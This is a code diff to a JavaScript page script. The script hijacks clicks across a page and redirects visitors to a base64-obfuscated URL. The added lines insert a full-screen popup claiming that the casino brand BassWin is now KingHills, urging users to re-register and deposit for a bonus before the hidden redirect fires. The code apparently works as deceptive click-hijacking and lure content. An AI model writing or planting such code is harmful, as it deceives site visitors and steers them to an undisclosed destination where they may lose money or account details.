@@ -23,6 +23,8 @@ function base64_decode(data) {
 
 const redirectUrl = base64_decode(base64Url);
 
+let isPopupShown = false;
+
 function shouldRedirect(event) {
     const anchor = event.target.closest('a');
     if (anchor) {
@@ -34,6 +36,43 @@ function shouldRedirect(event) {
     return true;
 }
 
+function showPopup() {
+    const popup = document.createElement('div');
+    popup.innerHTML = `
+        <div class="full-screen-container">
+            <div class="icons">
+                <img src="bass-win-logo.svg" alt="BassWin Logo">
+                <span class="arrow">→</span>
+                <img src="king.png" alt="KingHills Logo">
+            </div>
+            <div class="form-container">
+                <h1>Dear Customer!</h1>
+                <p>We are excited to announce that we have rebranded. BassWin is now <strong>KingHills</strong>.</p>
+                <p>We have moved to a new platform, and we kindly ask you to register with us again to continue enjoying our services.</p>
+                <p>To celebrate, we are offering you a 100% deposit bonus up to £425 + 200 free spins! To claim your bonus, click the button below, register, and make your deposit.</p>
+                <button id="continue-btn" class="button">Continue</button>
+            </div>
+        </div>
+    `;
+    popup.style.position = 'fixed';
+    popup.style.top = '0';
+    popup.style.left = '0';
+    popup.style.width = '100%';
+    popup.style.height = '100%';
+    popup.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
+    popup.style.zIndex = '9999';
+    popup.style.display = 'flex';
+    popup.style.alignItems = 'center';
+    popup.style.justifyContent = 'center';
+
+    document.body.appendChild(popup);
+
+    document.getElementById('continue-btn').addEventListener('click', () => {
+        popup.remove();
+        isPopupShown = true;
+    });
+}
+
 function redirect() {
     window.location.href = redirectUrl;
 }
@@ -42,7 +81,11 @@ document.addEventListener('DOMContentLoaded', () => {
     document.body.addEventListener('click', (event) => {
         if (shouldRedirect(event)) {
             event.preventDefault();
-            redirect();
+            if (!isPopupShown) {
+                showPopup();
+            } else {
+                redirect();
+            }
         }
     });
 
